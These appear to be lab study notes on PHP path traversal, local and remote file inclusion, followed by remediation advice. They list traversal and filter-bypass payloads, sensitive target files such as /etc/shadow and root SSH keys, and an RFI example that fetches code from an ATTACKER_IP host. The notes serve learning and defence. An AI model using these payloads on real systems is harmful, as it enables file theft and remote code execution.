## Path Traversal
The request:

```url
http://webapp.com/get.php?file=userCV.pdf
```

might be exploited using traversal methods:

```url
http://webapp.com/get.php?file=../../../../etc/passwd
```

Common targeted paths:

| Location                      | Description                                                                                                       |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| `/etc/issue`                  | Contains a message or system identification printed before the login prompt.                                      |
| `/etc/profile`                | Controls system-wide default variables, such as export variables, file creation mask (umask), and terminal types. |
| `/proc/version`               | Displays the version of the Linux kernel.                                                                         |
| `/etc/passwd`                 | Lists all registered users on the system.                                                                         |
| `/etc/shadow`                 | Contains hashed passwords for the system's users (requires elevated permissions to read).                         |
| `/root/.bash_history`         | Contains the command history for the root user.                                                                   |
| `/var/log/dmessage`           | Contains global system messages, including messages logged during system startup.                                 |
| `/var/mail/root`              | Contains all emails for the root user.                                                                            |
| `/root/.ssh/id_rsa`           | The private SSH key for the root user (or any known valid user on the server).                                    |
| `/var/log/apache2/access.log` | Logs all requests made to the Apache web server.                                                                  |
| `C:\boot.ini`                 | Contains boot options for Windows computers with BIOS firmware.                                                   |

Windows version examples:

```url
http://webapp.com/get.php?file=../../../../boot.ini
```

or

```url
http://webapp.com/get.php?file=../../../../windows/win.ini
```

In PHP, this is caused by the using `file_get_contents()` without proper validations.
## Local File Inclusion (LFI)
In PHP, the functions most commonly responsible for LFI vulnerabilities are `include`, `require`, `include_once`, and `require_once`.

### When no directory specified:
Code:

```php
<?PHP
    include($_GET["lang"]);
?>
```

intended usage:

```url
http://webapp.com/index.php?lang=EN.php
http://webapp.com/index.php?lang=AR.php
```

exploited:

```url
http://webapp.thm/index.php?lang=/etc/passwd
```

### When a directory is specified in the include
Code:

```php
<?PHP
    include("languages/". $_GET['lang']);
?>
```

intended usage:

```url
http://webapp.com/index.php?lang=EN.ph
```

Exploit:

```url
http://webapp.com/index.php?lang=../../../../etc/passwd
```

### When black-box testing and appended extensions
enpoint:

```url
http://webapp.com/index.php?lang=EN
```

after enter something invalid:

```php
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

we know ho many `../` needed.

```url
http://webapp.com/index.php?lang=../../../../etc/passwd
```

still error:

```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

The server might be looking up `/etc/passwd.php` instead of `/etc/passwd`. To bypass this, use `%00` (null byte):

```url
http://webapp.com/index.php?lang=../../../../etc/passwd%00
```

The `include()` call effectively becomes:

```php
include("languages/../../../../etc/passwd");
```

**Important:** The null byte trick was patched in PHP 5.3.4 and above.

### When keyword filtering with path bypass

Some devs might block access to specific files by filtering known paths like `/etc/passwd`.

We can use `/.` or `/..` to the end of the path. Because, if we request `/etc/passwd/.`, the operating system resolves `.` (current directory) and still returns `/etc/passwd`. Same with `/etc/passwd/..` resolve to `/etc`.

Can try both:

```url
http://webapp.com/index.php?lang=/etc/passwd%00
http://webapp.com/index.php?lang=/etc/passwd/.
```

### When stripping `../` from input
We can just double em:

```php
....//....//....//....//....//etc/passwd
```

this effectively becomes:

```url
../../../../etc/passwd
```

After strippened.

### When forced directory prefix
Expected:

```url
http://webapp.thm/index.php?lang=languages/EN.php
```

We can use:

```url
http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd
```

## Remote File Inclusion (RFI)
Instead of pointing the `include()` function at a local file, the attacker points it at a file hosted on a server they control.

With RFI, the attacker can control the content of the file entirely.

### Requirements
- `allow_url_fopen` (and sometimes `allow_url_include`) in PHP being enabled.

### What can be done in RFI?
- Sensitive info disclosure
- XSS
- DoS

### How it work?
1. Something like `/get.php?file=http://ATTACKER_IP:PORT/cmd.txt`
2. Server get the content remotely
3. Server injects the ocntent of `cmd.txt` into `include` function and **execute** it.
4. Attacker got the result of execution within the `get.php` page.

`cmd.txt` content example:

```php
<?PHP echo "Hello, World!"; ?>
```

## Remediation
### Validate User Input
```php
<?PHP
    $allowed = ['en' => 'languages/EN.php', 'ar' => 'languages/AR.php'];
    $lang = $_GET['lang'] ?? 'en';
    if (array_key_exists($lang, $allowed)) {
        include($allowed[$lang]);
    }
?>
```

### Disable Unnecessary PHP Features
```ini
allow_url_fopen = Off
allow_url_include = Off
```

### Turn Off Detailed Error Messages in Production
```ini
display_errors = Off
log_errors = On
```

### Keep Software Up to Date

### Deploy a WAF